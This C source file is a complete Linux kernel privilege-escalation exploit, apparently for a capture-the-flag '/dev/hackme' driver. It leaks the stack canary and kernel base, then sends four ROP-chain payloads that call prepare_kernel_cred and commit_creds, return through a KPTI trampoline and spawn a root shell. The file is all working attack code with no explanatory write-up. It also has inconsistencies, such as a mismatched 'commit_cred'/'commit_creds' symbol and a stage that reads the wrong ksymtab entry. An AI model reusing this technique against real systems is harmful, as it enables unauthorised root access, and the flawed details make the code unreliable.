#include <stdlib.h>
#include <stdio.h>
#include <stdint.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/mman.h>



void spawn_shell(void){
    printf("We back to userland!\n");
    uid_t uid = getuid();
    if(uid == 0){
        printf("UID is: %d\nYou just rooted the machine!\n", uid);
    }
    else {
        printf("UID is: %d\nYou didn't root the machine unfortunately..\n", uid);
        exit(-1);
    }
    system("/bin/sh");
}

void save_state(void){ // save the state of our user context
    __asm__(".intel_syntax noprefix;"
    "mov user_cs, cs;"
    "mov user_ss, ss;"
    "mov user_sp, rsp;"
    "pushfq;"
    "pop user_rflags;"
    ".att_syntax;");
}

uint64_t user_cs, user_ss, user_rflags, user_sp;
uint64_t prepare_kernel_cred = 0x0;
uint64_t commit_cred = 0x0;
uint64_t kpti_trampoline = 0x200f26;
uint64_t pop_rax_ret = 0x4d11;
uint64_t read_mem_pop1_ret = 0x4aae;
uint64_t pop_rdi_rbp_ret = 0x38a0;
uint64_t ksymtab_prepare_kernel_cred = 0xf8d4fc;
uint64_t ksymtab_commit_creds = 0xf87d90;
uint64_t user_rip = (uint64_t) spawn_shell;
uint64_t canary, image_base;
uint64_t cred_struct; 
void leak(void){
    uint64_t leak[42];
    int fd = open("/dev/hackme", O_RDWR | O_CREAT);
    if (fd < 0){printf("Error: couldn't open the target file!!\n");}
    read(fd, leak, sizeof(leak));
    canary = leak[16];
    image_base = leak[38] - 0xa157;
    kpti_trampoline += image_base;
    pop_rax_ret += image_base;
    read_mem_pop1_ret += image_base;
    pop_rdi_rbp_ret += image_base;
    ksymtab_prepare_kernel_cred += image_base;
    ksymtab_commit_creds += image_base;
}
void get_commit_creds(void){
    __asm__(".intel_syntax noprefix;"
    "add rax, ksymtab_commit_creds;"
    "mov commit_creds, rax;"
    ".att_syntax;");
}

void get_prepare_kernel_cred(void){
    __asm__(".intel_syntax noprefix;"
    "add rax, ksymtab_prepare_kernel_cred;"
    "mov prepare_kernel_cred, rax;"
    ".att_syntax;");
}

void get_kernel_cred_struct(void){
    __asm__(".intel_syntax noprefix;"
    "mov cred_struct, rax;"
    ".att_syntax;");
}
void stage1(void){
    int index = 16;
    uint64_t payload[50];
    payload[index++] = canary;
    payload[index++] = 0x4444444444444444; // rbx
    payload[index++] = 0x4343434343434343; // r12
    payload[index++] = 0x4242424242424242; // rbp
    payload[index++] = pop_rax_ret;
    payload[index++] = ksymtab_prepare_kernel_cred - 0x10;
    payload[index++] = read_mem_pop1_ret;
    payload[index++] = 0x0;
    payload[index++] = kpti_trampoline;
    payload[index++] = 0x0;
    payload[index++] = 0x0;
    payload[index++] = (uint64_t) get_prepare_kernel_cred;
    payload[index++] = user_cs;
    payload[index++] = user_rflags;
    payload[index++] = user_sp;
    payload[index++] = user_ss;
    
    int fd = open("/dev/hackme", O_RDWR | O_CREAT);
    if (fd < 0){printf("Error: couldn't open the target file!!\n");}
    write(fd, payload, sizeof(payload));
}

void stage2(void){
    int index = 16;
    uint64_t payload[50];
    payload[index++] = canary;
    payload[index++] = 0x4444444444444444; // rbx
    payload[index++] = 0x4343434343434343; // r12
    payload[index++] = 0x4242424242424242; // rbp
    payload[index++] = pop_rax_ret;
    payload[index++] = ksymtab_prepare_kernel_cred - 0x10;
    payload[index++] = read_mem_pop1_ret;
    payload[index++] = 0x0;
    payload[index++] = kpti_trampoline;
    payload[index++] = 0x0;
    payload[index++] = 0x0;
    payload[index++] = (uint64_t) get_commit_creds;
    payload[index++] = user_cs;
    payload[index++] = user_rflags;
    payload[index++] = user_sp;
    payload[index++] = user_ss;
    
    int fd = open("/dev/hackme", O_RDWR | O_CREAT);
    if (fd < 0){printf("Error: couldn't open the target file!!\n");}
    write(fd, payload, sizeof(payload));
}
void stage3(void){
    int index = 16;
    uint64_t payload[50];
    payload[index++] = canary;
    payload[index++] = 0x4444444444444444; // rbx
    payload[index++] = 0x4343434343434343; // r12
    payload[index++] = 0x4242424242424242; // rbp
    payload[index++] = pop_rdi_rbp_ret;
    payload[index++] = 0x0;
    payload[index++] = 0x0;
    payload[index++] = prepare_kernel_cred;
    payload[index++] = kpti_trampoline;
    payload[index++] = 0x0;
    payload[index++] = 0x0;
    payload[index++] = (uint64_t) get_kernel_cred_struct;
    payload[index++] = user_cs;
    payload[index++] = user_rflags;
    payload[index++] = user_sp;
    payload[index++] = user_ss;
    
    int fd = open("/dev/hackme", O_RDWR | O_CREAT);
    if (fd < 0){printf("Error: couldn't open the target file!!\n");}
    write(fd, payload, sizeof(payload));
}
void stage4(void){
    int index = 16;
    uint64_t payload[50];
    payload[index++] = canary;
    payload[index++] = 0x4444444444444444; // rbx
    payload[index++] = 0x4343434343434343; // r12
    payload[index++] = 0x4242424242424242; // rbp
    payload[index++] = pop_rdi_rbp_ret;
    payload[index++] = cred_struct;
    payload[index++] = 0x0;
    payload[index++] = commit_cred;
    payload[index++] = kpti_trampoline;
    payload[index++] = 0x0;
    payload[index++] = 0x0;
    payload[index++] = (uint64_t) spawn_shell;
    payload[index++] = user_cs;
    payload[index++] = user_rflags;
    payload[index++] = user_sp;
    payload[index++] = user_ss;
    
    int fd = open("/dev/hackme", O_RDWR | O_CREAT);
    if (fd < 0){printf("Error: couldn't open the target file!!\n");}
    write(fd, payload, sizeof(payload));
}
void exploit(void){
    leak();
    stage1();
    stage2();
    stage3();
    stage4();
}

int main(int argc, char **argv){
    save_state();
    exploit();
    return 0;
}